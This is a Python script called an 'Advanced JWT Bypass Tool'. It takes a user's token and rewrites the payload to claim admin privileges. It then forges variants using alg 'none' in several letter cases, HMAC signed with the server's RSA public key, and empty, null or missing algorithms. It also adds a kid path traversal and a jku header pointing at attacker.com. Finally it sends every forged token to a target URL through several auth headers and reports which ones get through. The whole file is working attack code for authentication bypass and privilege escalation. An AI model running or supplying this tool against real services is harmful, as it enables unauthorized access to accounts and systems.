#!/usr/bin/env python3
"""
Advanced JWT Bypass Tool
More sophisticated JWT bypass techniques
"""

import base64
import json
import hmac
import hashlib
import sys
import requests
from urllib.parse import quote, unquote
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def url_safe_b64_decode(data):
    """Decode URL-safe base64"""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data)

def url_safe_b64_encode(data):
    """Encode to URL-safe base64"""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def decode_jwt_token(token):
    """Decode JWT token and return header, payload, signature"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None, None
            
        header = json.loads(url_safe_b64_decode(parts[0]))
        payload = json.loads(url_safe_b64_decode(parts[1]))
        signature = parts[2]
        
        return header, payload, signature
    except Exception as e:
        print(f"Error decoding token: {e}")
        return None, None, None

def create_rsa_public_key_from_n_e(n_b64, e=65537):
    """Create RSA public key from modulus (n) and exponent (e)"""
    try:
        n_bytes = url_safe_b64_decode(n_b64)
        n = int.from_bytes(n_bytes, 'big')
        public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
        return public_key
    except Exception as e:
        print(f"Error creating public key: {e}")
        return None

def generate_bypass_variants(payload, public_key):
    """Generate multiple bypass variants"""
    variants = {}
    
    # 1. Classic none algorithm
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = url_safe_b64_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = url_safe_b64_encode(json.dumps(payload, separators=(',', ':')).encode())
    variants['none'] = f"{header_b64}.{payload_b64}."
    
    # 2. None with empty signature
    variants['none_empty'] = f"{header_b64}.{payload_b64}."
    
    # 3. None with different case
    header_none_upper = {"alg": "NONE", "typ": "JWT"}
    header_b64_upper = url_safe_b64_encode(json.dumps(header_none_upper, separators=(',', ':')).encode())
    variants['none_upper'] = f"{header_b64_upper}.{payload_b64}."
    
    # 4. None with mixed case
    header_none_mixed = {"alg": "None", "typ": "JWT"}
    header_b64_mixed = url_safe_b64_encode(json.dumps(header_none_mixed, separators=(',', ':')).encode())
    variants['none_mixed'] = f"{header_b64_mixed}.{payload_b64}."
    
    # 5. HS256 with public key as secret
    if public_key:
        pem_key = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        header_hs256 = {"alg": "HS256", "typ": "JWT"}
        header_b64_hs256 = url_safe_b64_encode(json.dumps(header_hs256, separators=(',', ':')).encode())
        signing_input = f"{header_b64_hs256}.{payload_b64}"
        signature = hmac.new(
            pem_key,
            signing_input.encode('utf-8'),
            hashlib.sha256
        ).digest()
        signature_b64 = url_safe_b64_encode(signature)
        variants['hs256_pubkey'] = f"{header_b64_hs256}.{payload_b64}.{signature_b64}"
    
    # 6. HS256 with stripped public key
    if public_key:
        pem_stripped = pem_key.decode().replace('-----BEGIN PUBLIC KEY-----', '').replace('-----END PUBLIC KEY-----', '').replace('\n', '')
        
        signing_input = f"{header_b64_hs256}.{payload_b64}"
        signature = hmac.new(
            pem_stripped.encode(),
            signing_input.encode('utf-8'),
            hashlib.sha256
        ).digest()
        signature_b64 = url_safe_b64_encode(signature)
        variants['hs256_stripped'] = f"{header_b64_hs256}.{payload_b64}.{signature_b64}"
    
    # 7. Invalid algorithm
    header_invalid = {"alg": "INVALID", "typ": "JWT"}
    header_b64_invalid = url_safe_b64_encode(json.dumps(header_invalid, separators=(',', ':')).encode())
    variants['invalid_alg'] = f"{header_b64_invalid}.{payload_b64}.fakesignature"
    
    # 8. Missing algorithm
    header_no_alg = {"typ": "JWT"}
    header_b64_no_alg = url_safe_b64_encode(json.dumps(header_no_alg, separators=(',', ':')).encode())
    variants['no_alg'] = f"{header_b64_no_alg}.{payload_b64}.fakesignature"
    
    # 9. Empty algorithm
    header_empty_alg = {"alg": "", "typ": "JWT"}
    header_b64_empty_alg = url_safe_b64_encode(json.dumps(header_empty_alg, separators=(',', ':')).encode())
    variants['empty_alg'] = f"{header_b64_empty_alg}.{payload_b64}.fakesignature"
    
    # 10. Null algorithm
    header_null_alg = {"alg": None, "typ": "JWT"}
    header_b64_null_alg = url_safe_b64_encode(json.dumps(header_null_alg, separators=(',', ':')).encode())
    variants['null_alg'] = f"{header_b64_null_alg}.{payload_b64}.fakesignature"
    
    # 11. Kid manipulation (if present in original)
    header_kid = {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}
    header_b64_kid = url_safe_b64_encode(json.dumps(header_kid, separators=(',', ':')).encode())
    variants['kid_lfi'] = f"{header_b64_kid}.{payload_b64}.fakesignature"
    
    # 12. JKU manipulation
    header_jku = {"alg": "RS256", "typ": "JWT", "jku": "http://attacker.com/jwks.json"}
    header_b64_jku = url_safe_b64_encode(json.dumps(header_jku, separators=(',', ':')).encode())
    variants['jku_hijack'] = f"{header_b64_jku}.{payload_b64}.fakesignature"
    
    return variants

def test_jwt_endpoint(url, token, headers=None):
    """Test JWT token against endpoint"""
    test_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    }
    
    if headers:
        test_headers.update(headers)
    
    # Test different authorization methods
    methods = [
        {'Authorization': f'Bearer {token}'},
        {'Authorization': f'JWT {token}'},
        {'X-Auth-Token': token},
        {'X-Access-Token': token},
        {'Token': token}
    ]
    
    results = []
    
    for method in methods:
        try:
            test_headers.update(method)
            response = requests.get(url, headers=test_headers, timeout=10, verify=False)
            results.append({
                'method': list(method.keys())[0],
                'status': response.status_code,
                'length': len(response.text),
                'response': response.text[:200] if response.text else ''
            })
        except Exception as e:
            results.append({
                'method': list(method.keys())[0],
                'status': 'ERROR',
                'length': 0,
                'response': str(e)
            })
    
    return results

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_advanced_bypass.py <ORIGINAL_JWT> <TEST_URL> [role]")
        print("Example: python3 jwt_advanced_bypass.py 'eyJ...' 'https://api.target.com/admin' admin")
        return
    
    original_token = sys.argv[1]
    test_url = sys.argv[2]
    role_type = sys.argv[3] if len(sys.argv) > 3 else "admin"
    
    # Decode original token
    header, payload, signature = decode_jwt_token(original_token)
    if not header or not payload:
        print("Failed to decode JWT token!")
        return
    
    print(f"=== Advanced JWT Bypass Testing ===")
    print(f"Target URL: {test_url}")
    print(f"Original Algorithm: {header.get('alg', 'unknown')}")
    print(f"Target Role: {role_type}")
    print()
    
    # Modify payload for privilege escalation
    if role_type.lower() == "admin":
        payload['sub'] = 'admin'
        payload['role'] = 'admin'
        payload['admin'] = True
        payload['exp'] = 9999999999
        if 'name' in payload:
            payload['name'] = 'Administrator'
        # Add common admin fields
        payload['is_admin'] = True
        payload['privileges'] = ['admin', 'read', 'write', 'delete']
        payload['scope'] = 'admin'
    
    print("Modified payload:")
    print(json.dumps(payload, indent=2))
    print()
    
    # Create RSA public key
    public_key_n = "uwoGuY-6oDHYznmLZ5wDZXKpTN6h1-wyZsxLjnh7BpS6sR1VxzI8B_9hNPPvnhVrBxhMoitg1hPSxLTN5fYUZj-5Ykb1H7W4yTcRkOKvUTxERogVtQL4fBayKdI9vbGQKRqCx095CM0_JZ-tGlxnhWMuRaWpOb7pUMfSkpPgl6Npod5JGbkSzM0iekAQsV0tadT1lGz7cWJhATmfRzRLwCnP5jzTYRIiro00kz2srMVrzha8egKYtZDgjwkcg3XmKRF-QZwzLofLRo7gWA8WLdoh6iXiNTaHqCJ3WvKLE58KQbp0fYk2QRwexquDOrYHPo_Yb54gila9qydkS0DvlQ"
    public_key = create_rsa_public_key_from_n_e(public_key_n)
    
    # Generate bypass variants
    variants = generate_bypass_variants(payload, public_key)
    
    print("=== Testing Bypass Variants ===")
    print()
    
    # Test original token first
    print("[BASELINE] Testing original token...")
    baseline_results = test_jwt_endpoint(test_url, original_token)
    baseline_status = baseline_results[0]['status'] if baseline_results else 'UNKNOWN'
    print(f"Baseline status: {baseline_status}")
    print()
    
    # Test each variant
    successful_bypasses = []
    
    for variant_name, variant_token in variants.items():
        print(f"[{variant_name.upper()}] Testing...")
        results = test_jwt_endpoint(test_url, variant_token)
        
        for result in results:
            status = result['status']
            method = result['method']
            
            # Check if this looks like a successful bypass
            if status == 200 or (status != baseline_status and status not in [401, 403]):
                print(f"  🎯 POTENTIAL BYPASS! {method}: {status}")
                print(f"     Response: {result['response'][:100]}...")
                successful_bypasses.append({
                    'variant': variant_name,
                    'method': method,
                    'status': status,
                    'token': variant_token
                })
            else:
                print(f"  ❌ {method}: {status}")
        
        print()
    
    # Summary
    if successful_bypasses:
        print("=== 🎯 SUCCESSFUL BYPASSES FOUND! ===")
        for bypass in successful_bypasses:
            print(f"Variant: {bypass['variant']}")
            print(f"Method: {bypass['method']}")
            print(f"Status: {bypass['status']}")
            print(f"Token: {bypass['token'][:50]}...")
            print()
    else:
        print("=== ❌ No bypasses found ===")
        print("Try manual analysis:")
        print("1. Check for different JWT libraries")
        print("2. Test with different payloads")
        print("3. Analyze server error messages")
        print("4. Check for timing attacks")

if __name__ == "__main__":
    main()

